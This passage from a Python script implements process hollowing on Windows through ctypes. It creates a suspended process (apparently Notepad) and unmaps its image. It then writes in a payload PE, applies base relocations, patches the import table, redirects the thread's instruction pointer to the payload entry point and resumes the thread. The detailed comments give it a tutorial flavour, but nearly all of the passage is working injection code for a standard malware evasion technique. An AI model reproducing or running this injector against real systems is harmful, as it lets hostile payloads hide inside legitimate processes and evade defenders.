    - these are absolute VAs, and are hard-coded in the binary itself
    - based on the assumption that the payload will be loaded at the PreferredBaseAddress

    However, when allocating memory, VirtualAllocEx() may not be able to allocate memory at the PreferredBaseAddress (eg due to ASLR)
    - the payload will now be mapped at a different address in memory
    - the hard-coded pointers are now all wrong, and point to empty/unallocated space where the compiler thought strings/vars would be

    To address this, the compiler creates a '.reloc' section within the PE
    - an array of data blocks that map the exact locations of all hard-coded absolute memory addresses within the binary
    - all these pointers must be manually adjusted to their new absolute memory addresses in virtual memory

    Steps - Overview
    ------------------
    1) find 'reloc_rva'
    2) find correct '.reloc' section + find location of Base Relocation Data Table in payload
    3) iterate through blocks, updating 'Offsets' for specific 'Type'

    Steps - In Detail
    -----------------
    1) find 'reloc_rva'

    the 'reloc_rva' is read from the file (on-disk) and is a memory-offset that must be added to the ActualBaseAddress (in-memory) in order to find where the BaseRelocation Table Data exists (in-memory)
    - found in DataDirectory[5], at the end of the OptionalHeader
    
    [Optional Hdr]
    [Data_Dir_0]
    [Data_Dir_1] -> Import Directory (this will be used in IAT fixing...)
    [Data_Dir_5] <- here, 'IMAGE_DIRECTORY_ENTRY_BASERELOC'

    The DataDirectory is just a list of pointers, where each entry is 8-bytes
    [[          Data Directory NN               ]]
     [VirtualAddress - 4 Bytes]  [Size - 4 Bytes]


    2) translate the reloc_rva to a physical file-offset -> rva_to_file_offset()
    - this is not guaranteed to be '.reloc'
    - if v_addr <= reloc_rva < (v_addr + v_size), then you have found the right section
    - this returns the offset to where the Base Relocation Data Table exists
    
    3) Base Relocation Data Table
    - iterate through the Relocation Blocks of the BRDT
    - for values of Type 10, update the absolute pointer located at that offset, by adding the Delta 
    - 
    """

    print(f"\n[+] Performing BASE Relocations") 

    # Check if this even needs to be done...
    delta = lpBaseAddress - preferred_base
    if delta == 0:
        print(f"    -> Nil Delta, skipping relocations")
        return
    else:
        print(f"    -> Delta calculated: {hex(delta)}, Performing Manual Relocation")


    with open(payload_path, 'rb') as f:
        # ----- Step 1: find 'reloc_rva' -----
        f.seek(get_reloc_dir_offset(f))
        reloc_rva, reloc_size   = struct.unpack('<II', f.read(8)) 
        
        if reloc_rva == 0:
            print(f"[!!] No relocation table found in payload.")
            return

        # ----- Step 2: translate 'reloc_rva' into offset to DataTable in payload -----
        reloc_data_table_offset = rva_to_file_offset(f, reloc_rva)
        if reloc_data_table_offset == 0:
            print(f"[!] Could not map 'Relocation' virtual-address -> file-offset")
            return

        # ----- Step 3: -----
        #
        # Iterate through Relocation Blocks of BaseRelocationDataTable
        # - the BRT is a collection of small, Relocation Blocks
        # - each small block only handles 4k page sizes (due to 12-bit Offset size)
        # - blocks contains an array of Type/Offset values
        # - the Type that will be updated, is Type 10 -> 'IMAGE_REL_BASED_DIR64'
        # - the Offset maps the location, of a hardcoded absolute pointer
        # - the pointer at that location, will be updated with the Delta
        #
        # In other words, a memory address needs to be patched:
        # - the pointer is located at the ActualBaseAddress + PageRva + RelocationOffset
        # - the value in this pointer, will be updated with the addition of the Delta
        #
        #          Block Header (Bytes)        
        # -----------------------------------
        # [ Page RVA (4) ][ SizeOfBlock (4) ]
        #
        #  TYPE OFFSET ENTRIES ARRAY (Bytes)
        # -----------------------------------
        #        [TypeOffset[0],   2]
        #        [TypeOffset[1],   2]
        #        [TypeOffset[n],   2]
        #
        #    TYPEOFFSET[n] (bits)
        # ----------------------------
        # [ Type (4) ] [ Offset (12) ]
        
        current_offset = 0
        while current_offset < reloc_size:
            f.seek(reloc_data_table_offset + current_offset)
            
            # unpack 8-byte header
            page_rva    = struct.unpack('<I', f.read(4))[0]
            size_block  = struct.unpack('<I', f.read(4))[0]

            if size_block == 0: break
            
            # determine how many Type/Offset entries in block
            num_entries = (size_block - RELOC_BLOCK_HEADER_SIZE) // RELOC_ENTRY_SIZE
            
            # iterate through each entry (2-bytes each -> but 4 & 12 bit aligned)
            for _ in range(num_entries):
                entry = struct.unpack('<H', f.read(2))[0]
                
                # Type -> bit-shift right by 12 to isolate top 4 bits
                reloc_type = entry >> RELOC_TYPE_BITSHIFT
                
                # Offset -> bitwise AND with 0x0fff to isolate bottom 12 bits
                reloc_offset = entry & RELOC_OFFSET_MASK

                # if Type 10 (IMAGE_REL_BASED_DIR64) -> patch address
                if reloc_type == 10:
                    patch_addr = int(lpBaseAddress) + page_rva + reloc_offset
                    
                    # populate current value -> orig_val buffer
                    orig_val = ctypes.c_uint64(0)
                    
                    if not kernel32.ReadProcessMemory(
                        hProcess,
                        ctypes.c_void_p(patch_addr),
                        ctypes.byref(orig_val),
                        ctypes.sizeof(orig_val),
                        None
                    ):
                        raise winerr()
                        
                    # add delta value -> write back
                    fixed_val = ctypes.c_uint64(orig_val.value + delta)

                    if not kernel32.WriteProcessMemory(
                        hProcess,
                        ctypes.c_void_p(patch_addr),
                        ctypes.byref(fixed_val),
                        ctypes.sizeof(orig_val),
                        None
                    ):
                        raise winerr()
                        
                    print(f"Patching at {hex(patch_addr)}: {hex(orig_val.value)} -> {hex(fixed_val.value)}")

            # increment offset to move to next block
            current_offset += size_block    

    print(f"[!] Base Relocations complete")


# --------------------- IAT Fixing ----------------------

def iat_fix_read_ascii_string(f: object , file_offset: int) -> tuple[str, bytes]:
    """ read a null-terminated ASCII string, from a given file offset """
    
    f.seek(file_offset)
    string_bytes = b""
    while True:
        char = f.read(1)
        if not char or char == b"\x00":
            break
        string_bytes += char
        
    return string_bytes.decode("ascii", errors="ignore"), string_bytes


def iat_fix_parse_descriptors(f: object, import_data_table_offset: int):
    """
    Iterates through current IMAGE_IMPORT_DESCRIPTOR blocks until hitting a null entry
    - each descriptor is 20 Bytes, and tells you the name of a DLL dependency
    - each field is 4 Bytes in length
    
    [ OriginalFirstThunk (ILTA RVA) ] -> points to Import Lookup Table
    [ DateTimeStamp                 ] -> 0 if not bound
    [ ForwarderChain                ] -> 1 if no forwarder
    [ Name RVA                      ] -> point to ASCII DLL namme
    [ FirstThunk (IAT RVA)          ] -> Import Address Table

    OriginalFirstThunk
    ------------------
    - contains an RVA that points to the start of the Import Lookup Table (ILT)
    - also known as the Import Name Table (INT)
    - array of entries -> of pointers (thunks) to locate functions to import, and how to import them (by name/ordinal)
    - these functions will be imported from the dll listed in name_rva (4th field)

    First Thunk
    -----------
    - contains an RVA that points to the start of the Import Address Table
    - architecturally, IAT exact structural twin to ILT (OriginalFirstThunk)
    - contains identical number of entries, and represents same list of functions
    - however upon loading of the payload, the in-memory IAT of the payload is initially stale/blank
    - as it was copied directly from it static, on-disk state
    - therefore the in-memory payload IAT must be patched with correct, complete addresses of required functions

    Note: Thunk Entries themselves (pointed to by Original/FirstThunk) are 8 bytes each
    """

    descriptor_idx = 0

    while True:
        f.seek(import_data_table_offset + (descriptor_idx * IMAGE_IMPORT_DESCRIPTOR_SIZE))

        # unpack descriptor - memory map in 3) doc-string
        orig_first_thunk_rva, timestamp, forwarder_chain, name_rva, first_thunk_rva = struct.unpack('<IIIII', f.read(20))
        
        if name_rva == 0: break # Null descriptor marks the end
        
        # resolve DLL name
        dll_name_offset = rva_to_file_offset(f, name_rva)
        dll_str, dll_bytes = iat_fix_read_ascii_string(f, dll_name_offset)
        
        # load DLL into injector process emory space -> to get its base
        h_dll = kernel32.LoadLibraryA(dll_bytes)
        if not h_dll:
            h_dll = kernel32.GetModuleHandleA(dll_bytes)
            
        if not h_dll:
            print(f"[!] CRITICAL: Could not find/load library: {dll_str}")
            descriptor_idx += 1
            continue

        # do NOT return here - as would break loop on first item found
        yield dll_str, h_dll, orig_first_thunk_rva, first_thunk_rva
        descriptor_idx += 1 


def iat_fix_parse_thunks(f: object, orig_first_thunk_rva: int, h_dll: int):
    """
    Loops through the 8-byte thunk table arrays for a specific imported DLL layout
    - OriginalFirstThunk contains pointer to ILT/INT
    - patch absolute VAs into FirstThunk (IAT)
    - map functions (by string name or ordinal integer) via local API resolution.
    - for each function() in the DLL, use kernel32.GetProcAddress()

    IMAGE_IMPORT_DESCRIPTOR (from Index 1)
       └── OriginalFirstThunk (RVA) 
              └── Points to: [ Import Lookup Table (ILT) ]
                                  ├── Entry 1: 0x00004120 (Highest bit 0 -> RVA to Name)
                                  ├── Entry 2: 0x8000000F (Highest bit 1 -> Import by Ordinal #15)
                                  └── Entry 3: 0x00000000 (Null terminator -> End of functions)

    Thunk memory layout (8 bytes)
    -----------------------------
    Mode A: Import by Ordinal (Highest bit set to 1)
    ________________________________________________________________________
    [ 1 |        zeros / padding (47 bits)       | ordinal number (16 bits) ]
    ------------------------------------------------------------------------
    
    Mode B: Import by Name (Highest bit set to 0)
    ________________________________________________________________________
    [ 0 |               IMAGE_IMPORT_BY_NAME_RVA (63 bits)                  ]
    ------------------------------------------------------------------------
    - here the import_by_name_rva is passed to rva_to_file_offset() to get physical location in file
        
    NameRVA memory layout:
    __________________________________________________________
    [ Hint (2 Bytes) | Name String (variable, null terminated ]
    ----------------------------------------------------------
    """

    thunk_idx = 0
    ilt_start_file_offset = rva_to_file_offset(f, orig_first_thunk_rva)
    
    while True:
        f.seek(ilt_start_file_offset + (thunk_idx * THUNK_SIZE_X64))
        thunk_val = struct.unpack('<Q', f.read(THUNK_SIZE_X64))[0]
        
        if thunk_val == 0: 
            break # Termination entry for current library reached
            
        # Mode A: Import by raw numeric Ordinal index (Bit 63 active)
        if thunk_val & ORDINAL_FLAG_X64:
            ordinal_number = thunk_val & ORDINAL_MASK
            func_str = f"Ordinal_{ordinal_number}"
            func_addr = kernel32.GetProcAddress(h_dll, ctypes.c_void_p(ordinal_number))
        # Mode B: Import by textual name entry point (Bit 63 clear)
        else:
            name_struct_offset = rva_to_file_offset(f, thunk_val)
            func_str, func_bytes = iat_fix_read_ascii_string(f, name_struct_offset + 2) # Skip 2-byte Hint
            func_addr = kernel32.GetProcAddress(h_dll, func_bytes)
        
        # do NOT return here - as would break loop on first item found
        yield thunk_idx, func_str, func_addr
        thunk_idx += 1


def iat_fix(hProcess: wintypes.HANDLE, lpBaseAddress: int, payload_path: str) -> None:
    """
    Overview:
    ---------
    - manually resolve/patch the Import Address Table (IAT) of the payload
    - first half of logic closely matches that of base_relocations()
    
    Details:
    --------
    1) locate 'import_rva' <- DataDirectory[1]
    
    IMAGE_OPTIONAL_HEADER
     └── DataDirectory[1]    - IMAGE_DIRECTORY_ENTRY_POINT
          ├── VirtualAddress - 'import_rva'
          └── Size           - 'import_size'
    
    2) translate 'import_rva' -> file-offset where the ImportDirectoryTable exists in payload

    'import_rva'
      └── (Translate via Section Headers) 
            └── file_offset_to_import_directory_table 
                  └── Points to: [ IMAGE_IMPORT_DESCRIPTOR for DLL #1 ] (20 bytes)
                                 [ IMAGE_IMPORT_DESCRIPTOR for DLL #2 ] (20 bytes)
                                 [ Null-Thunk Termination Descriptor  ] (20 bytes of 0x00)

    3) iterate through each IMAGE_IMPORT_DESCRIPTOR

    4) iterate through Thunks in each descriptor 
    
    5) patch the target -> WriteProcessMemory() to write _va into IAT of target process
    """

    print(f"\n[+] Fixing Import Address Table (IAT) Manually:")
    
    with open(payload_path, 'rb') as f:

        # ----- Step 1: find 'import_rva' from DataDirectory[1] -----
        import_dir_offset = get_import_dir_offset(f)

        f.seek(import_dir_offset)
        import_rva, import_size = struct.unpack('<II', f.read(8))

        if import_rva == 0:
            print("    -> No imports found.")
            return

        # ----- Step 2: translate 'import_rva' into offset to DataTable in payload ----- 
        import_data_table_offset = rva_to_file_offset(f, import_rva)
        if import_data_table_offset == 0:
            print("[!] Could not map 'Import' virtual-address -> file-offset")
            return
        
        
        # ----- Step 3: Iterate through the IMAGE_IMPORT_DESCRIPTORs -----
        for dll_str, h_dll, orig_first_thunk_rva, first_thunk_rva in iat_fix_parse_descriptors(f, import_data_table_offset):    
            print(f"    -> Resolving imports for {dll_str}...")


            # ----- Step 4: iterate through Thunks
            for thunk_idx, func_str, func_addr in iat_fix_parse_thunks(f, orig_first_thunk_rva, h_dll):

                if not func_addr:
                    print(f"    [!!!!] FAILED to resolve: {dll_str} -> {func_str}")
                    continue

                print(f"    [+] IAT {dll_str} -> {func_str} @ {hex(func_addr)}")


                # ----- Step 5: write resolved address into IAT of target process
                target_process_iat_entry_va = lpBaseAddress + first_thunk_rva + (thunk_idx * THUNK_SIZE_X64)

                if not kernel32.WriteProcessMemory(
                    hProcess,
                    ctypes.c_void_p(target_process_iat_entry_va), 
                    ctypes.byref(ctypes.c_uint64(func_addr)), 
                    THUNK_SIZE_X64, 
                    None
                ):
                    raise winerr()

    print("    -> IAT Fix Complete.")


# ----------------- Update Thread Context -----------------


def get_payload_entry_point_rva(payload: str) -> int:
    """ 
    Return the Entry Point, Relative Virtual Address of the payload
    - extract the 'AddressOfEntryPoint' field, from within the OptionalHeader
    - this RVA value must be added to the ActualBaseAddress of the payload in memory
    - the resulting sum, is the Absolute Virtual Address (VA) of the payload's entry point
    """

    with open(payload, 'rb') as f:
        pe_offset = get_pe_header_offset(f)
        optional_header_offset = get_optional_header_offset(f)
        f.seek(optional_header_offset + OPT_HDR_ENTRY_POINT)

        entry_point_rva = struct.unpack('<I', f.read(4))[0]

        print()
        print(f"payload: '{os.path.basename(payload)}'")
        print(f"    -> entry_point_rva : {hex(entry_point_rva)}")

    return entry_point_rva


def update_thread_context(
        hThread: wintypes.HANDLE,
        entry_point_va: int
) -> None:

    """
    Retrieve CPU-register info for target hThread
    - re-direct Rip (Instruction Pointer) and Rcx to new payload entry point
    - re-align the Rsp (Stack Pointer)
    """
    
    # Get original_rip, using 1232-byte raw-buffer + 16 for manual alignment
    raw_buffer = ctypes.create_string_buffer(CONTEXT_BUFFER)
    
    # this is just the memory location
    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
    
    # map chcar array onto the aligned address -> struct.pack_into() / unpack_from()
    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
    
    # set ContextFlags to CONTEXT_ALL, @ offset 48 <- return all registers
    struct.pack_into("<I", aligned_buffer, CTX_X64_CONTEXT_FLAGS, CONTEXT_ALL)


    # ---------- GET: Current state of thread's registers ----------
    if not kernel32.GetThreadContext(hThread, aligned_addr):
        raise winerr()
    print(f"\n[+] Captured Current Thread State: Success")


    # ----- Save original values for important registers
    original_rip = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RIP)[0]
    original_rsp = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RSP)[0]
    original_rcx = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RCX)[0]

    
    # Apply re-direction - Rip and Rcx
    struct.pack_into("<Q", aligned_buffer, CTX_X64_RIP, entry_point_va)
    struct.pack_into("<Q", aligned_buffer, CTX_X64_RCX, entry_point_va)

    
    # ----- Instruction Pointer @ offset 248
    print(f"\n[+] Adjusting Instruction Pointer:")
    print(f"    -> Orig Rip: {hex(original_rip)}")
    print(f"    -> New Rip:  {hex(entry_point_va)}")

    # ----- Rcx Register
    print(f"\n[+] Adjusting Rcx:")
    print(f"    -> Orig Rcx: {hex(original_rcx)}")
    print(f"    -> New Rcx:  {hex(entry_point_va)}")


    # ----- Stack Pointer @ offset 152
    # - align to 16-bytes boundry
    # - reserve Shadow Space on stack to save/restore values from function calls
    # - adjust for return address on stack

    new_rsp = (original_rsp & ALIGNMENT_MASK) - SHADOW_SPACE - RET_ADDR_SIZE
    struct.pack_into('<Q', aligned_buffer, CTX_X64_RSP, new_rsp)

    print(f"\n[+] Adjusting Stack Pointer Alignment:")
    print(f"    -> Old Rsp:           {hex(original_rsp)}")
    print(f"    -> New Rsp (Aligned): {hex(new_rsp)}")


    # ----- Apply Changes
    if not kernel32.SetThreadContext(hThread, aligned_addr):
        raise winerr()
    print(f"\n[+] Applying Changes to Thread Context: Successful")


# ==================== [ EXECUTION ] ====================

def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"    -> ProcessId: {dwProcessId}")
    print(f"    -> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)


# ========================================================================
#                   Main functionality starts here
# ========================================================================


print("\n\n# ----------------- PHASE: Selection -----------------")
print("[+] Creating SUSPENDED Process")
hThread, hProcess, dwThreadId, dwProcessId = create_process()


print("\n\n# ----------------- PHASE: Allocation -----------------")

print("[+] Hollowing Process")
pbi, img_base_addr_va = get_img_base_addr_va(hProcess)
hollow_process(hProcess, img_base_addr_va)

# get PreferredBaseAddress for payload
preferred_image_base_va = get_preferred_image_base_va(payload)

with open(payload, 'rb') as f:
    size_of_payload = get_size_of_image(f)


# Allocate memory at requested Base Address -> 3 options (all confirmed working)
#
# - PreferredBaseAddress (of PE file)
# - ImageBaseAddress (of process)
# - let VirtualAllocEx() decide

# Option 1
actual_base_address_va = allocate_memory(hProcess, preferred_image_base_va, size_of_payload)

# Option 2
#actual_base_address_va = allocate_memory(hProcess, img_base_addr_va, size_of_payload)

# Option 3
#actual_base_address_va = allocate_memory(hProcess, 0, size_of_payload)


print("\n\n# ----------------- PHASE: Injection -----------------")

#write_payload(hProcess, actual_base_address_va, payload)
with open(payload, 'rb') as f:
    write_payload_headers(hProcess, actual_base_address_va, f)
    write_payload_sections(hProcess, actual_base_address_va, f)


print("\n\n# ----------------- PHASE: Applying Fixes -----------------")
# - PEB Patching
# - Base Relocations
# - IAT Fixing
# - Update Thread Context

# PEB Patching
patch_peb(hProcess, pbi, actual_base_address_va)

# Base Relocations
base_relocations(
    hProcess, 
    actual_base_address_va, 
    preferred_image_base_va, 
    payload
)

# IAT Fixing
iat_fix(hProcess, actual_base_address_va, payload)

# Update Thread Context
print(f"\n[+] ----- Updating Thread Context -----")

payload_entry_point_rva = get_payload_entry_point_rva(payload)
actual_entry_point_va = actual_base_address_va + payload_entry_point_rva
print(f"    -> actual_entry_point_va: {hex(actual_entry_point_va)}")

update_thread_context(hThread, actual_entry_point_va)


print("\n\n# ----------------- PHASE: Execution -----------------")
resume_orig_process(hThread, dwThreadId, dwProcessId)


print("\n\n# ----------------- PHASE: Clean-Up -----------------")
print()
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
